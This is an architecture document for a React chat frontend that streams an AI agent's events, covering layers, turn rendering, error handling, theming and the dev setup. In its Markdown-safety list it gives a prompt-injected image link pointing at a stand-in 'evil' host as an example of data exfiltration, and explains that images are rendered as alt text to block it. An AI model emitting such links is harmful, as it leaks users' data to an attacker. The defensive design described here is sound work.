# 002. webapp: the React chat

How the frontend in `services/webapp` is put together and how a chat event becomes pixels. This doc describes
the app **as it is**; it is updated together with the code. The server side of the same request is in
[arch/001](001_chat-request-flow.md).

## Layers

```
src/
  pages/        ChatPage ── owns useChat(), lays out the containers, "New chat", the list in a TailScroll
     │
  containers/   MessageList, Reply, Activity, Composer ── map the turn model to components
     │      │
     │   components/   Button, TextArea, Bubble, Markdown, TailScroll, Spinner ── props in, JSX out;
     │                 no api/ or chat/ imports
     ▼
  chat/         useChat() hook; turn.ts: applyEvent, closeTurn, splitTurn, describeActivity (pure)
     │
  api/          streamChat(), HttpError; openapi.gen.ts (generated)
  index.css     Tailwind + design tokens
```

Imports point down only. What the chat *means* (when a turn is over, what counts as an error) is in `chat/turn.ts`
as pure functions, tested without a DOM. Components know nothing about chats, so they can be restyled or reused in
`/admin` later.

## The path of one message

```
Composer: Enter ──▶ useChat.send(message)                    thread_id: one per conversation
                      │  appends {id, message, reply: {parts: [], status: "streaming"}}  → busy = true
                      ▼
                    streamChat({message, thread_id}, signal)   api/chat.ts
                      │  fetch POST /api/chat/stream
                      │    └─ Vite proxy: strips /api ──▶ harness:8000/chat/stream
                      │  body → TextDecoderStream → EventSourceParserStream
                      │  each SSE message → {type: event name, ...data} as ChatEvent
                      ▼
                    applyEvent(turn, event)                    chat/turn.ts
                      │  text / reasoning → append to the last part of that kind, or a new part
                      │  tool_call → a tool part · tool_result → fills the tool part with its id
                      │  done → "done" · error → "error" + message
                      ▼
                    closeTurn(turn[, error])
                      │  the stream ended (or threw) and the turn is still "streaming" → "error"
                      ▼
                    status ≠ "streaming" → busy = false → Send is enabled again
```

`busy` isn't stored: it's "the last exchange is still streaming", so it can't drift from the turns.

**Conversations.** `useChat` holds one `thread_id` (a UUID) per conversation; harness keeps the history under it,
so a follow-up has context. "New chat" aborts the running request (`AbortController` → the fetch closes → the
proxy closes the upstream → harness cancels the run), clears the list and takes a fresh id. The aborted loop's
late updates hit an id that's no longer in the list, so they change nothing, and its `catch` stays quiet. The old
thread lives on in harness's memory until a restart.

A turn that ends in "Connection lost" stays in its thread: harness saved the question but no answer, so the next
answer on that thread covers both, and a cut between a tool call and its result breaks the thread (ROADMAP
backlog). "New chat" is the way out.

The message list sits in the same `TailScroll` as the live activity block: it follows the stream while you're at
the bottom and stays put once you scroll up.
`send` updates state with functional `setExchanges` because the loop outlives the render that started it.

## A turn on screen

A turn is an ordered list of parts: `reasoning`, `text`, `tool` (a call, and its result once it arrives). Parallel
calls resolve in any order, so a result finds its call by `tool_call_id`.

`Reply` splits the parts on every render with `splitTurn`: the **answer** is the text after the agent's last
step, everything before it is the **activity**. Nothing is stored: text the model writes before a tool call
("I'll check the stock") is the answer until the call arrives, then it moves into the activity as an interim
note.

| Turn state | Activity block | Answer |
|---|---|---|
| streaming, no answer yet | **live**: open, `ACTIVITY_MAX_LINES` = 6 lines tall (padding included), follows the newest step (`TailScroll`) until the user scrolls up; the header shows a spinner and the running summary | — |
| streaming, answer started / done / error | **folded**: one line, `Reasoning · 3 tool calls · 1 failed` (`describeActivity`); a click opens it at full height | Markdown |

A tool step is `✓ wms_get_stock(sku: "TAPE-48")`: a spinner until the result, then ✓ or ✗; a call that never
got a result (the turn ended in an error or a dropped stream) shows `–` instead of spinning forever. The result
(pretty JSON when it parses) sits behind a native `<details>`. Reasoning is muted italics, an interim note plain
text. A whitespace-only text part doesn't start an answer.

`TailScroll` decides "the user let go" from the scroll **direction**: its own `scrollTop` assignment fires the
scroll event a frame later, and content that grew in between would look like "not at the bottom". Growth never
moves `scrollTop` up; a user does.

The answer goes through `react-markdown` + `remark-gfm` (tables). Model output is untrusted text:

- react-markdown builds React elements, so raw HTML in the text shows as text, never as markup;
- images render as their alt text: a prompt-injected `![](https://evil/?d=…)` would otherwise make the browser
  send data out by itself;
- links open in a new tab (`rel="noreferrer"`): the chat lives in memory, a same-tab click would lose it;
- a wide table scrolls inside its own wrapper instead of pushing the chat sideways.

`Reply` is memoized: every event re-renders the list, and only the streaming reply should re-parse its Markdown.
Event types the build doesn't know (a newer harness) are skipped; known ones are checked for exhaustiveness at
compile time (`event satisfies never`).

## Errors

| What | Caught in | Shown as |
|---|---|---|
| `error` event | `applyEvent` | the event's `message` under the reply; text received before it stays |
| non-2xx (422; 502 from the proxy when harness is down) | `streamChat` throws `HttpError` | "Request failed (502)" |
| network failure, or a stream that ends without `done`/`error` | `useChat` → `closeTurn` | "Connection lost" |

Every path ends the turn, so the composer never stays locked. One of them needs help from the dev proxy: Vite's
proxy pipes the response and reports upstream errors only before the first byte, so a harness that dies
mid-stream would leave the browser's response open forever. `configure` in `vite.config.ts` destroys it when the
upstream response closes incomplete, and the client sees the break. `streamChat` cancels its reader on any exit,
so an early return or a parse error closes the connection too. `fetch` doesn't reconnect, so a dropped stream
doesn't start the agent again (an `EventSource` would).

## Theming

`index.css` resets Tailwind's palette (`--color-*: initial`) and defines semantic tokens in `@theme`: `bg`,
`surface`, `border`, `fg`, `muted`, `accent`, `on-accent`, `danger`, `success`. Only these exist as utilities
(`bg-surface`, `text-muted`), so components can't hard-code a gray. Utilities read the variables at runtime,
so dark mode is the same variables redefined under `prefers-color-scheme: dark`, and a reskin is one file.

Markdown is styled by `@tailwindcss/typography` (`prose`). The plugin brings its own gray palette, so `index.css`
points its `--tw-prose-*` variables at the tokens: Markdown follows the theme with no `prose-invert`.

## Dev loop

| Mode | How | Proxy target |
|---|---|---|
| `make up` | `webapp` service, `node:22.22.3-alpine`, `vite --host 0.0.0.0` on `127.0.0.1:8080`; watch syncs `src/` (HMR), rebuilds on `package*.json`, `vite.config.ts`, `index.html` | `HARNESS_URL=http://harness:8000` |
| host | `npm --prefix services/webapp run dev` | default `http://localhost:8000` |

`strictPort`: a busy 8080 fails the start instead of moving to 8081. Event types come from harness's OpenAPI:
after changing `app/api/chat/schemas.py`, run `make api-types` and commit `src/api/openapi.gen.ts`.

## Reading order

`src/api/chat.ts` → `src/chat/turn.ts` (+ its test) → `src/chat/useChat.ts` → `src/pages/ChatPage.tsx` →
`src/containers/Reply.tsx` → `src/containers/Activity.tsx` → `src/components/TailScroll.tsx` → `src/index.css`.
